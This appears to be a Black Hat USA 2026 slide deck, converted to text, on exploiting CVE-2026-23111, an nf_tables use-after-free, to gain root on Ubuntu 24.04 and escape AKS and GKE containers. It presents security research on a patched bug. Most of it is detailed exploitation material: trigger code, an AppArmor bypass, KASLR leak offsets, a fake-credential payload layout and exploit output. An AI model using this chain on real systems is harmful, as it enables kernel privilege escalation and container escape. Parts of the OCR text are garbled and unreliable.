---
title: "!secure A Single Wrong Negation to Root Linux and Escape Managed Containers"
speakers: ["Tristan Madani"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Tristan Madani_!secure A Single Wrong Negation to Root Linux and Escape Managed Containers.pdf"
pages: 73
sha256: "84d29c500f90a3626f7b5a4ec75477632580729247972262a922b2c7c33fcc52"
text_chars: 47703
ocr_pages: 24
has_ocr: true
redacted_secrets: 0
ocr_confidence: 91.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:46:33Z"
---
# !secure A Single Wrong Negation to Root Linux and Escape Managed Containers

**Speakers:** Tristan Madani  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Tristan Madani_!secure A Single Wrong Negation to Root Linux and Escape Managed Containers.pdf` (73 pages)


## Slide 1

Information Classification: General

## Slide 2

## **!secure A Single Wrong Negation to Root Linux and Escape Managed Kubernetes**

Tristan Madani Black Hat USA 2026

## Slide 3

##### **$ WHOAMI**

###### **// Tristan Madani**

- CEO @ **Talence Security** (Research & Training)

- Security Researcher (140+ CVEs)

- Founder @ **HackForge.com** & **HackWiki.com**

- Previously: Director of Detection Eng., Blue Team Leader, Blue Team Investigator, Red Team, PenTest, Security Architect, Network Security, etc.

- Lecturer · Speaker · Mentor

- OSCE · OSCP · ex-GXPN · GREM

- Perpetual Learner

###### **// Example of Research & CVEs**

- Linux Kernel (first LPE CVEs in 2019)

- Linux ksmbd (Kernel SMB Server)

- Ubuntu AppArmor (11+)

- Apple (XNU, WebKit, libxslt, etc.)

- Mozilla Firefox

- Apache HTTP Server

- Sudo

- Samba

- Linux Drivers:

- Intel

- Qualcomm/Atheros

- MediaTek

- Broadcom

- Texas Instrument

- Marvell

- Realtek

- Silicon Labs

- HAProxy

- Go

- Ruby ERB

- CPython

- OpenVPN

- libssh

- libssh2

- xrdp

- VLC

- GnuTLS

- GNU Emacs

- GNU inetutils

- GraphicsMagick

- Courier IMAP

- Asterisk

- Coturn

- OpenSIPS

- Tenable (3 products)

- Cisco (2 products)

- Rapid7 (Velociraptor, MSF)

- Wazuh

- Socat

- YARA

- OpenCTI

- Hydra

- QEMU

###### **_And numerous other firmwares/drivers, libraries, web apps, telecom, and commercial platforms._**

3

Information Classification: General

## Slide 4

One inverted boolean in nf_tables

###### **AGENDA**

A deterministic use-after-free

###### **►  Part I:  The Bug**

Root cause analysis of the inverted genmask check

Part II:  Exploitation From UAF to root on hardened Ubuntu 24.04

Part III:  Container Escape Escaping AKS and GKE managed Kubernetes

Part IV:  Disclosure Three vendors, three reasons, same result

Closing:  Lessons Learned What the industry should fix

Information Classification: General

## Slide 5

##### **OVERVIEW: DIFF & CVE**

static void nft_map_catchall_activate(const struct nft_ctx *ctx, struct nft_set *set) { list_for_each_entry(catchall, &set->catchall_list, list) { ext = nft_set_elem_ext(set, catchall->elem); **-        if (!nft_set_elem_active(ext, genmask)) +        if (nft_set_elem_active(ext, genmask))** continue;

commit f41c5d151078 -- Feb 4, 2026 net/netfilter/nf_tables_api.c

-> author: Andrew Fasano on 2026-02-04 17:46:58 +0100

-> committer: Florian Westphal on 2026-02-05 08:36:59 +0100

**-> Assigned: CVE-2026-23111**

Information Classification: General

## Slide 6

##### **THE SCALE**

**<u>CVE-2026-23111 Impact:</u>**

**Ubuntu** 24.04 LTS (Desktop + Server) **EXPLOITED AKS** (Azure Kubernetes Service) **EXPLOITED GKE** Standard (Google Kubernetes Engine) **EXPLOITED** EKS (Amazon Elastic Kubernetes Service) **NOT TESTED** Any Kubernetes on Ubuntu 24.04 nodes **VIABLE**

<u>NOTE:</u> Also other mainstream distros were impacted. Introduced:  Linux 6.4, commit 628bd3e49cba (Jun 16, 2023) Fixed:       commit f41c5d151078 (Feb 4, 2026) Duration:    2 years, 7 months, 19 days **<u>Patching status (as of today):</u>** Ubuntu backport: **PATCHED** Azure kernel fix: **PATCHED** GKE kernel fix: **PATCHED**

Information Classification: General

## Slide 7

And then:

### **Question:**

### **How does one wrong "!" become:**

pod$  →  node#

on managed Kubernetes

**user$  →  root# on Ubuntu 24.04 (and other distros)?**

Information Classification: General

## Slide 8

##### **WHAT IS nf_tables?**

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHAT IS nf_tables?
Attacker Process CAP_NET_ADMIN Netlink Socket
unshare -Urn NETLINK NETFILTER
syscall
nfnetlink (dispatch)
nf_tables
transaction engine + object management
Tables Transactions Expressions
chains, sets, rules batch commit/abort verdict, dynset, .
Netfilter Hooks (packet path)
INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING
Docker, Kubernetes, iptables-nft, firewalld — every container uses this
Key Facts
Default on Ubuntu, Debian,
Fedora, RHEL, SUSE, Arch
Reachable from unprivileged
user namespaces
Prior CVEs in nf_tables
CVE-2024-1086 (UAF)
CVE-2024-0193 (UAF )
CVE-2026-23111 (this)
Attack Path
unshare(CLONE NEWUSER)
|
CAP_NET ADMIN (in ns)
Full nf_tables access
|
Trigger UAF — ROOT
```

## Slide 9

##### **THE TARGET STACK**

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE TARGET STACK
Ubuntu 24.04 LTS - Mitigation Stack
RQ
6.8.0-41-generic, all mitigations enabled
Randomized kernel base address
x ; LEAKED
Can't hardcode target addresses
x No user-space memory access from kernel
SMAP / SMEP IRRELEVANT
Blocks ret2user techniques
Every ret replaced with safe return thunk
RETHUNK X COP (no ret)
Classical ROP is constrained
16 random sub-caches per slab size
RANDOM_KMALLOC_CACHES X¥ PAGE PIN
Heap feng shui is dead
Unprivileged user namespace creation restricted
AppArmor x BUSYBOX
Blocks unshare/clone with CLONE_NEWUSER
Stack buffer overflow protection
Stack Canaries x NO STACK
Random canary value checked on return
All are irrelevant or bypassed. No mitigation survived.
```

## Slide 10

user@ubuntu:~$ busybox unshare -Urn ./exploit --no-ns [*] CVE-2026-23111 -- nf_tables catchall UAF

[*] Target: 6.8.0-41-generic (Ubuntu 24.04 LTS)

[*] Stage 1: Trigger -- draining chain->use...

[+] chain->use == 0, DELCHAIN succeeded

[*] Stage 2: KASLR leak...

[+] module_base = 0xffffffffc0635000

[+] vmlinux_base = 0xffffffffba200000

[*] Stage 3: Heap spray -- COP payload...

[+] COP payload at 0xffff888005a3c080

[*] Stage 4: Triggering code execution...

[+] ======================================== [+] GOT ROOT! uid=0 euid=0 [+] ======================================== root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~# cat /etc/shadow | head -1 root:$6$...:19839:0:99999:7:::

Information Classification: General

## Slide 11

And then the same primitive escalates to container escape. **Azure Kubernetes Service pod$ → node# Google Kubernetes Engine pod$ → node#**

**Default pods. No capabilities. No privileges.**

Information Classification: General

## Slide 12

##### **nf_tables OBJECT MODEL**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nf_tables Object Model
nf_tables OBJECT MODEL
Table — Chain — Set (verdict map with catchall element)
nft_table eit (family =
nft_chain
name = "victim"
blob gen 0 = rule blob
table = &tl | handle =
GOTO verdict — chain->use++
This is the ONLY reference
keeping chain->use = 1
NFPROTO_INET)
2
nft_set
name = "s1" (verdict map)
dtype = NFT DATA VERDICT
catchall element
verdict = GOTO
binding: chain="victim"
Normal enforcement: DELCHAIN fails with EBUSY if use > 0
The bug: abort path drains use to O WITHOUT removing the GOTO reference
Why it is exploitable:
1. Catchall matches
every packet . GOTO
2. GOTO increments
chain->use to 1
3. Abort DRAINS
use back to 0
4. DELCHAIN succeeds
(use==0 passes check)
USE-AFTER-FREE
Deterministic, no race
```

## Slide 13

##### **THE TRANSACTION MODEL**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE TRANSACTION MODEL
nf_tables Transaction Model
Batch processing: prepare ALL ops, then commit or abort
Userspace netlink batch:
BEGIN opi: DELSET | [ op2: NEWCHAIN |
Y
Kernel processes ALL ops (even after error):
> record on commit_list
op2: NEWCHAIN x EEXIST (duplicate name) +> BATCH_FAILURE
Key: op1's prepare-phase side effects ALREADY HAPPENED before op2 fails
{ All ops succeeded?
nf_tables_commit() __nf_tables_abort()
The abort path calls nft_map_catchall_activate() — which has the inverted check.
```

## Slide 14

##### **DEACTIVATE AND ACTIVATE: THE SYMMETRY**

**DEACTIVATE (CORRECT) ACTIVATE (BUG!)** nft_map_catchall_deactivate() nft_map_catchall_activate() { { list_for_each_entry(catchall, ...) { list_for_each_entry(catchall, ...) { ext = nft_set_elem_ext(...); ext = nft_set_elem_ext(...); if (!nft_set_elem_active(ext, if ( **!** nft_set_elem_active(ext, genmask)) genmask)) continue; continue; **<-- SAME!** nft_set_elem_change_active(...); nft_clear(ctx->net, ext); nft_setelem_data_deactivate(...); nft_setelem_data_activate(...); // chain->use-// chain->use++ } } } } Both use **if (!active) continue** — skips inactive elements.

**Deactivate: correct (process active ones to deactivate them).**

**Activate: WRONG (should process inactive ones to re-activate them).**

Information Classification: General

## Slide 15

##### **THE LOGIC EXPLAINED**

**nft_set_elem_active(ext, genmask):**

returns !(ext->genmask & genmask)

genmask bit CLEAR  -->  element is **ACTIVE -->  returns true** genmask bit SET    -->  element is **INACTIVE -->  returns false**

**In deactivate (CORRECT):** if (!active) continue;     <--  skip inactive, process active  OK

**In activate (BUGGY):**

if (!active) continue;     <--  skip inactive, process active  WRONG should process inactive!

###### **FIXED:**

if (active) continue;      <--  skip active, process inactive  OK

Information Classification: General

## Slide 16

##### **THE REFCOUNT DRAIN**

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE REFCOUNT DRAIN
STATE 1: Initial Setup
chain "victim" catchall element
use = genmask = 0
STATE 2: After Prepare (deactivate ran)
chain "victim" catchall element
use = 0 genmask = 1 (INACTIVE)
TE 3: After Abort — BUG!
chain "victim" catchall element
use = 0 (NOT RESTORED) genmask = 1 (INACTIVE)
activate: if (!active) continue; + element is INACTIVE + SKIPPED
chain->use NOT restored. The one-char bug.
DELCHAIN "victim"
STATE 4: Chain Freed — USE-AFTER-FREE
DANGLING PTR catchall element
FREED
still holds GOTO + ???
kfrée( chain)
DELCHAIN succeeds (use == 0). Chain memory released.
Catchall still holds GOTO pointer to freed memory — USE-AFTER-FREE
```

## Slide 17

##### **A DETERMINISTIC UAF**

#### **No race condition. No timing window. No probability.**

###### **Compare:**

CVE-2022-32250: required heap spray timing CVE-2024-1086: required page-level race CVE-2026-23111: a counted loop

#### **The trigger is 100% deterministic.**

Information Classification: General

## Slide 18

##### **THE TRIGGER CODE**

**// Setup: table + chain + verdict map with catchall -> GOTO victim** create_table("t1"); create_chain("t1", "victim"); create_chain("t1", "base"); create_map_with_catchall("t1", "m1", "victim");   // chain->use = 1 **// Trigger: DELSET + intentional error -> forced abort** batch_begin(); build_DELSET("m1");             // prepare: deactivates catchall //          chain->use-- -> 0 build_NEWCHAIN("base",          // EEXIST -> forces batch abort NLM_F_CREATE | NLM_F_EXCL); batch_end(); batch_send(); **// abort: activate SKIPS inactive element. use stays 0. // Free the chain** batch_begin(); build_DELCHAIN("victim");       // succeeds: use == 0 batch_end(); batch_send_commit(); **// chain struct is kfree'd. UAF achieved.**

Information Classification: General

## Slide 19

##### **WHAT WE CONTROL (THE FREED OBJECT)**

Information Classification: General


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHAT WE CONTROL (THE FREED OBJECT)
struct nft_chain - Freed Object Layout
120 bytes in kma g — thre ploitatior mitives
blob_gen_0 | CODE EXECUTION
truct nft_rule_ blob * packet eval follows ptr
blob gen 1 (struct nft_rule blob *)
rhlhead (struct rhlist_head)
table INFO LEAK
ct nft_table * table ptr leaks heap addr
handle (u64)
use (u32) = 0
name
char *
udlen (ul6) + udata (u8 *)
blob next (struct nft_rule blob *)
kmalloc-cg-128
Three primitives from one freed struct: code exec, info leak, arbitrary read.
Reclaim with controlled data — full exploitation chain
```

## Slide 20

##### **THE UAF TIMELINE**

Information Classification: General


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE UAF TIMELINE
Exploit Pipeline - From Bug to Code Execution
1. Setup 2. Trigger 3. Free 4. Reclaim 5. ROOT
nft_table tl Netlink batch: DELCHAIN "victim" Heap spray: TCP connect()
chain "victim" DELSET(s1) use==0 = allowed! table userdata nft_do_ chain
set + catchall NEWCHAIN (dup) kf ree( chain) 248B COP payload + COP chain
— forced abort
Step-by-step breakdown:
120B = kmalloc-cg-128 Triple constraint buf commit_creds
chain->use = 1 (catchall element references chain via GOTO verdict)
2 Abort cycle: use drained to 0 — activate() skips inactive element (the one-char bug)
DELCHAIN succeeds (use==0). Chain memory released: 120 bytes in kmalloc-cg-128
Heap spray: reclaim freed slot with 248-byte COP payload (table userdata, same sub-cache)
Trigger: TCP connect() — nft_do_chain — fake blob_gen_O — COP — commit_creds(fake_cred)
```

## Slide 21

##### **SECTION RECAP**

###### **What we have:**

- [+]  Deterministic UAF (no race)

- [+]  120B nft_chain in kmalloc-cg-128

- [+]  Dangling pointer (catchall elem)

- [+]  blob_gen_0: code execution

- [+]  chain->name: arbitrary read

###### What's blocking us:

- [-]  KASLR: don't know kernel base

- [-]  RETHUNK: ROP gadgets constrained

- [-]  RANDOM_KMALLOC: wrong cache

- [-]  AppArmor: can't create userns

Information Classification: General

## Slide 22

From UAF to Root on Ubuntu 24.04

###### **AGENDA**

All default mitigations enabled

Part I:  The Bug Root cause analysis of the inverted genmask check

###### **►  Part II:  Exploitation**

From UAF to root on hardened Ubuntu 24.04

Part III:  Container Escape Escaping AKS and GKE managed Kubernetes

Part IV:  Disclosure Three vendors, three reasons, same result

Closing:  Lessons Learned What the industry should fix

Information Classification: General

## Slide 23

##### **THE EXPLOITATION ROADMAP**

Information Classification: General


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE EXPLOITATION ROADMAP
Exploitation Roadmap - 5 Stages
AppArmor Bypass
Get CAP_NET_ADMIN without root
defeats:
AppArmor
Dual KASLR Leak
defeats:
Module base + vmlinux base (two independent address spaces)
KASLR
Heap Spray + RANDOM_KMALLOC_CACHES Bypass acne:
Reclaim freed chain with COP payload (248 bytes) RND inihos
COP Chain (Call-Oriented Programming) a
Forward-edge code reuse — no ret gadgets needed RETHUNK
nft_dynset_eval > ops->update = commit_creds
Stable Return + Post-Exploitation
Clean return to userspace with uid=0
Each stage solves one constraint. No step is optional.
```

## Slide 24

##### **STAGE 1: THE APPARMOR PROBLEM**

**Ubuntu 24.04:** kernel.apparmor_restrict_unprivileged_userns = 1

**Effect:** unshare(CLONE_NEWUSER | CLONE_NEWNET) -> EPERM No CAP_NET_ADMIN -> No nftables access

================================================================

**Qualys userns bypasses (March 2025):** aa-exec -p unconfined -- ./exploit **Status: PATCHED in 6.8.0-100** aa-exec now transitions to "unprivileged_userns" -> strips CAP_NET_ADMIN

Information Classification: General

## Slide 25

##### **STAGE 1: THE BUSYBOX BYPASS**

**/etc/apparmor.d/busybox**

profile busybox /usr/bin/busybox flags=(unconfined) {

- # Named unconfined profile -- inherits all capabilities

- # Does NOT trigger userns_create transition

}

**user$ busybox unshare -Urn ./exploit --no-ns**

- [*] User namespace created ( **CAP_NET_ADMIN** acquired)

- [*] Network namespace created

- [*] nftables operations available

busybox-static: dependency of ubuntu-minimal (ALWAYS installed) restrict_unprivileged_unconfined: disabled until Ubuntu 25.04

Information Classification: General

## Slide 26

##### **STAGE 2: THE KASLR PROBLEM**

Information Classification: General


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
STAGE 2: THE KASLR PROBLEM
KASLR: Two Independent Address Spaces
Both must be leaked independently. One leak is not enough
Virtual Address Space What each unlocks:
1. Free victim3 chain (UAF)
vmlinux 2. Spray 2048 nft_last expressions nft_dynset_eval addr
ops->update target
1. Module base needed for:
kernel text + data 3. Reclaim name buf with nft_last_ops ptr
~ COP dispatch
2. vmlinux base needed for:
Leak 2: vmlinux Kernel Base commit_creds addr
init_cred addr
Target: victim4 name (kmalloc-cg-256) init_user_ns addr
1. Overwrite victim4.name pointer ~ fake cred payload
2. Point to struct module (from Leak 1)
3. Read module.list.prev via GETSETELEM Both together:
Oxffffffffc... 4. prev links back into vmlinux .data
modules
nf_tables.ko
1.5 GB range
COP chain dispatches
Randomized independently vmlinux_base = prev - offset through module code to
per boot Depends on Leak 1 (sequential) call vmlinux function
Both KASLR bases defeated
Leak 1 feeds Leak 2: module base locates struct module, whose list.prev reveals vmlinux.
Both leaks use the same dangling pointer read primitive, no new bugs needed.
```

## Slide 27

##### **KASLR LEAK: THE DANGLING POINTER READ**

Information Classification: General


> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
KASLR LEAK: THE DANGLING POINTER READ
Dangling Pointer Read Chain
GETSETELEM follows: catchall — freed chain — freed name — controlled data leak
GETSETELEM path catchall element Leak Techniques
verdict: GOTO
1. Kernel follows Leak 1: Module base
verdict — chain
Spray 2048 nft_last
. Reads chain->name DANGLING .. reclaim name buf
for response with nft_last_ops ptr
to userspace LAD ABBE, 7 Weap addr - 0x54980
Overwrite victin4.name
— point to struct module
+ read module.list.prev
vmlinux base =
prev - offset
Both KASLR bases defeated
Three dangling pointers, two KASLR leaks, zero race conditions
catchall element stays live after chain is freed — read chain fields — read name buffer
All via legitimate GETSETELEM netlink requests. No timing sensitivity.
```

## Slide 28

##### **KASLR LEAK: MODULE BASE**

###### **nft_last expression spray:**

struct nft_expr { const struct nft_expr_ops *ops;   // +0x00 -> MODULE .rodata unsigned char data[];             // +0x08 (priv data) };

ops->size = 16 bytes -> kmalloc-cg-16 Matches freed chain->name slot!

**Steps:**

1. Free chain->name (16 bytes, kmalloc-cg-16)

2. Spray 2048 nft_last expressions -> same cache

3. One reclaims the freed slot

4. GETSETELEM reads "chain name" -> nft_last_ops pointer

module_base = nft_last_ops - 0x54980

Information Classification: General

## Slide 29

##### **KASLR LEAK: VMLINUX BASE**

**struct module (__this_module in nf_tables.ko):**

+0x00: state = MODULE_STATE_LIVE +0x08: list.next -> (next module) +0x10: list.prev -> &modules <-- VMLINUX BSS! +0x18: name = "nf_tables"

nf_tables is always the most recently loaded module

-> list.prev always points to the global 'modules' list head

**Steps:**

1. Compute: mod_list_prev = module_base + 0x3D580 + 0x10

2. Spray fake chain with name ptr -> mod_list_prev

3. GETSETELEM reads "chain name" -> &modules pointer

vmlinux_base = &modules - 0x25dd880

Information Classification: General

## Slide 30

##### **DEFEATING RANDOM_KMALLOC_CACHES**

**CONFIG_RANDOM_KMALLOC_CACHES (Ubuntu 24.04 GA):**

16 randomized sub-caches per slab size class. Each kmalloc callsite -> statically mapped to one sub-cache at boot. Attacker spray from different callsite -> different sub-cache. Heap feng shui is "dead."

**The weakness:**

The mapping is per-CALLSITE, not per-allocation. Same callsite = same sub-cache. Always.

nf_tables_addchain -> nla_strdup -> sub-cache X nf_tables_addchain -> nla_strdup -> sub-cache X   (SAME!) nf_tables_addchain -> nla_strdup -> sub-cache X   (ALWAYS!)

Information Classification: General

## Slide 31

##### **SLAB PAGE PINNING**

Information Classification: General


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SLAB PAGE PINNING
RANDOM_KMALLOC_ CACHES Bypass: Slab Page Pinning
16 sub-caches per size class. Mapping is per-callsite, not per-allocation.
X Naive Spray (fails)
Victim freed in sub-cache[3]:
Spray lands in random sub-caches:
sub-cache[7]
NEVER RECLAIM
Spray and victim in different sub-caches
Same callsite = same sub-cache:
nft chain alloc - always [N]
Step 1: Pin 200 chains (fill slab page)
PIN FREE PIN PIN
Step 2: Spray (same callsite — same [N])
sub-cache[N]
sub-cache[N PIN PIN PIN
COP payload lands in victim's slot
Key insight: RANDOM_KMALLOC_CACHES mapping is per-callsite, not per-allocation.
If the victim and spray use the same kernel callsite, they always land in the same sub-cache.
PIN _CHAIN_COUNT=200 keeps the slab page active so the freed slot is reused by the spray.
```

## Slide 32

##### **PROBABILISTIC TO DETERMINISTIC**

###### **Parent Process retry loop:**

for attempt in 1..30: child = fork() if child: unshare(CLONE_NEWNET) try_kaslr_leak() if success: write /tmp/kaslr_cache try_cop_chain() exit() waitpid(child) if /tmp/kaslr_cache exists: skip Stage 2 on next try

Attempt 1: ~1/16 chance (spray vs sub-cache) Attempt 2+: leak CACHED -> skip to Stage 4 -> Expected: root within 4-5 attempts

Information Classification: General

## Slide 33

##### **THE RETHUNK PROBLEM**

**CONFIG_RETHUNK=y (Ubuntu 24.04): Before:                     After:** function:                   function: ...                         ... ret    <- 0xc3              jmp __x86_return_thunk => Compiler-emitted **RET** replaced with **jmp __x86_return_thunk** . => Unaligned 0xc3 bytes still exist but NOT at instruction boundaries. **Classical ROP chain:** pop rdi; ret -> (address) pop rsi; ret -> (value) ... **Status: Constrained - We use a different approach!**

Information Classification: General

## Slide 34

##### **CALL-ORIENTED PROGRAMMING**

ROP uses backward-edge (RET) -> **affected by RETHUNK** COP uses forward-edge (CALL/JMP) -> **unaffected**

+----------------------------------------------+ |  nft_do_chain evaluation loop:               | |                                              | |  for each rule in chain->blob:               | |    for each expr in rule:                    | |      expr->ops->eval(expr, regs, pkt);       | |              ^                               | |              |                               | |      INDIRECT CALL through ops pointer       | |      -> We control ops                       | |      -> We control what gets called          |

+----------------------------------------------+

34

Information Classification: General

## Slide 35

##### **THE COP CHAIN: nft_dynset_eval**

**void nft_dynset_eval(const struct nft_expr *expr, ...)** { struct nft_dynset_priv *priv = nft_expr_priv(expr); struct nft_set *set = priv->set; **// [1] attacker-controlled** const struct nft_set_ops *ops = set->ops; **// [2] at set+0xC0** ops->update(set, ...); **// [3] CALL: ops->update(set)** } **//        | //  commit_creds(set) //        | //  set IS the fake cred!**

================================================================

priv->set -> fake_set (= fake_cred) fake_set + 0xC0 -> self-referencing ops table ops->update -> commit_creds

Call: commit_creds(set) = commit_creds(fake_cred) Return: 0 -> NFT_BREAK -> clean unwind

Information Classification: General

## Slide 36

##### **THE TRIPLE CONSTRAINT PAYLOAD**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE TRIPLE CONSTRAINT PAYLOAD
Triple Constraint: 248 Bytes - Three Structures Simultaneously
One COP payload buffer must be valid as nft_rule_blob + struct cred + aa_label
Offset nft_rule_blob struct cred
size = 0x70 usage = 0x40000000
+0x00
dlen = 0x68 atomic_long_t (8 bytes)
rule expr dispatch ptr uid=0, gid=0 (root)
nft_dynset priv data cap effective aa_label STARTS
(set/binding pointers) (all 1s = full capabilities) count=1, size=1
set ptr, binding cap_bset, cap ambient label flags, hcount
nft_dynset priv data cont. jit_keyring, user_ns FLAG_STALE bit CLEARED
security = &buf+0xD0
addin
(p 9) — points to fake LSM blob
FAKE LSM BLOB — aa_task_ctx at blob offset+0x08
aa task ctx.label = &buf+0x28 (points back to aa label overlay)
ops SELF-REFERENCE — set+0xCO = &buf+0xE8 (points to itself)
Kernel reads ops->update from the NEXT field — +0xFO
ops->update = commit_creds (vmlinux_base + OxXXXXXX)
+OxF8 248 bytes total — kmalloc-cg-256
Three constraints: nft_rule_blob (dispatch) struct cred (root, full caps) aa_label (unconfined)
Zero wasted bytes. commit_creds(buf) installs this as current->cred. AppArmor sees UNCONFINED. black hat
USA
```

## Slide 37

##### **THE FLAG_STALE DISCOVERY**

**cap_effective overlays aa_label->flags at the SAME memory offset.**

Bits in 0x1ffffffffff (FULL_CAPS): bit 1  -> FLAG_UNCONFINED (0x002)    GOOD: skips permission checks bit 11 -> FLAG_STALE     (0x800)    BAD: triggers label replacement AppArmor sees FLAG_STALE -> calls aa_label_find_merge() -> walks label->proxy chain -> dereferences fake pointer -> CRASH ================================================================ **Fix:** cap_effective = FULL_CAPS & ~0x800ULL;  // Clear bit 11 **Lost:** CAP_NET_BROADCAST (unused since the 90s) **Gained:** Stable kernel -- no crash

Information Classification: General

## Slide 38

##### **THE label.size CONSTRAINT**

**cap_bset (8 bytes at cred+0x48) overlays TWO aa_label fields:**

Bytes 0-3: label->secid  (harmless) Bytes 4-7: label->size   (CRITICAL)

FULL_CAP_MASK = 0x000001ffffffffff

-> secid = 0xFFFFFFFF

-> size  = 0x1FF = **511** profiles (!)

**AppArmor iterates:** for i in 0..size: profile = vec[i] With size = 511: reads 511 pointers past buffer -> **CRASH**

================================================================

**Fix:** cap_bset = 0x00000001ffffffffULL -> secid = 0xFFFFFFFF (harmless)

-> size  = 1 (exactly one profile in vec[])

-> vec[0] handled safely via FLAG_UNCONFINED

Information Classification: General

## Slide 39

##### **AVOIDING THE EXECVE CRASH**

**apparmor_file_permission():         apparmor_bprm_creds_for_exec():** label = current_label();            label = get_cred_label(); if (unconfined(label))              // NO unconfined check! return 0; **<-- SAFE** fn_for_each(label, profile, // never touches vec[]               profile_transition(...)); // -> dereferences vec[0] **--> CRASH**

================================================================

**Solution:**

**Child process (with fake creds, uid=0):** fd = open("/bin/sh", O_RDONLY);       // file_permission **-> OK** // copy /bin/sh to /tmp/rootsh chmod("/tmp/rootsh", 04755);          // setuid root _exit(0);                             // NO execve

**Parent process (normal creds):**

execve("/tmp/rootsh");                // real cred -> **AppArmor OK** // -> root shell via SUID bit

Information Classification: General

## Slide 40

##### **THE COMPLETE COP MEMORY LAYOUT**

**248 bytes -- one allocation, four functional regions**

**+0x00  blob.size=0x70                       nft_rule_blob header  <-- Execution dispatch +0x08** rule_dp: is_last=0, dlen=0x68

**+0x10** &nft_dynset_ops (module addr)        fake expr ops **+0x18** heap_addr2+0x28 (priv->set)

**+0x20** padding + control fields

**+0x28  FAKE CRED                            uid=0, gid=0          <-- Payload** ...  all IDs zero, full caps              root credentials **+0xA8** security -> +0xD0 **+0xB0** user -> root_user **+0xB8** user_ns -> init_user_ns **+0xC0** ucounts -> init_ucounts

**+0xD0  FAKE LSM BLOB                        cred.security target +0xD8** aa_task_ctx.label -> +0x28           points to aa_label

**+0xE8** self-referencing ops ptr             ops table **+0xF0  &commit_creds                        THE CALL TARGET      <-- Target**

Information Classification: General

## Slide 41

##### **THE is_last BIT TRICK**

**nft_do_chain rule iteration:**

rule = blob->data; while (1) { evaluate_expressions(rule); if ( **rule->is_last** )                <-- bit 0 of rule_dp header break; rule = next_rule(rule); }

**In our payload:**

+0x08: rule_dp #1 -- **is_last=0** , **dlen=0x68** (our dynset expr) +0x78: next "header" = **heap_addr2 | 1** ^ **bit 0 already set!** -> **is_last = 1** -> **loop terminates**

The payload data naturally provides the termination signal. No second rule_dp needed.

Information Classification: General

## Slide 42

##### **PUTTING IT ALL TOGETHER**

Information Classification: General


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PUTTING IT ALL TOGETHER
COP Execution Flow
| 2. nft_do_chain(fake_chain)
. blob = chain->blob gen 0
rule_dp: dlen=0x
LL (not ret)
loes not block
. CALL nft_dynset_e
fake c
ddr2 +
(+ +0xE8)
>turn @ > NFT_BREAK = root
Result: current->cred = fake_cred (uid=0, full caps, FLAG_UNCONFINED)
All via legitimate kernel CALL instructions. RETHUNK ne [e black hat
USA
```

## Slide 43

##### **LPE: LET'S ASSEMBLE ALL PIECES TOGETHER**

###### **How the exploit works?**

**On Ubuntu 24.04 (6.8.0-41): Pre: AppArmor bypass - busybox unconfined profile Stage 1: Trigger UAF - drain victim3->use via DELSET abort Stage 2: Wait for RCU grace period + chain destruction Stage 2b: KASLR leak - vmlinux base via __this_module list.prev Stage 3: Second UAF - drain victim4->use via DELSET abort Stage 3b: Heap leak — spray msg_msg (1 per queue) Stage 4: Destroy msg queues, prepare COP spray Stage 4c: Add lookup rule to base_chain Stage 5: Trigger packet → fire COP chain → ROOT (uid=0)**

**Let’s demonstrate!**

Information Classification: General

## Slide 44

**UBUNTU DEMONSTRATION (6.8.0-41-generic)**

**Steps Recap:**

44

Information Classification: General

## Slide 45

##### **MITIGATIONS OVERVIEW**

**Mitigation                 Bypass Technique -----------------------    ----------------------------------------AppArmor userns** busybox named unconfined profile **KASLR** Dual leak: nft_last_ops + module.list **RETHUNK** COP via nft_dynset_eval dispatch (forward-edge calls, sidesteps return thunks) **RANDOM_KMALLOC_CACHES** Slab page pinning + KASLR caching (same-callsite -> same sub-cache) **SMAP / SMEP** All data in kernel heap (no user pages) -- irrelevant **Stack canaries** No stack corruption (COP = no ROP) -- irrelevant

Information Classification: General

## Slide 46

###### **AGENDA**

Part I:  The Bug Root cause analysis of the inverted genmask check Part II:  Exploitation From UAF to root on hardened Ubuntu 24.04

From unprivileged pod to host root on managed Kubernetes

Azure Kubernetes Service (AKS)    6.8.0-1044-azure Google Kubernetes Engine (GKE)    6.8.0-1040-gke

**►  Part III:  Container Escape** Escaping AKS and GKE managed Kubernetes

Part IV:  Disclosure Three vendors, three reasons, same result

Closing:  Lessons Learned What the industry should fix

Information Classification: General

## Slide 47

##### **WHY KUBERNETES IS DIFFERENT**

Information Classification: General


